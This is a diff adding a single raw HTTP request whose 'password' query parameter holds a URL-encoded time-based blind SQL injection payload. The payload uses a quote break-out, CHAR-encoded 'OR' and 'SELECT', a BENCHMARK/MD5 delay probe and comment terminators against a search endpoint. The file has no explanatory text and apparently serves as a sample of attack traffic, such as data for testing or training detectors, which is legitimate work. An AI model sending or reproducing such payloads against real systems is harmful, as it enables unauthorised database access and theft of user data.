@@ -1,0 +1,6 @@
+GET /search.php?password=%27%20CHAR%2879%2C82%29%20BENCHMARK%28817124%2C%20MD5%281%29%29--%253b%20CHAR%2883%2C69%2C76%2C69%2C67%2C84%29%201%20-- HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
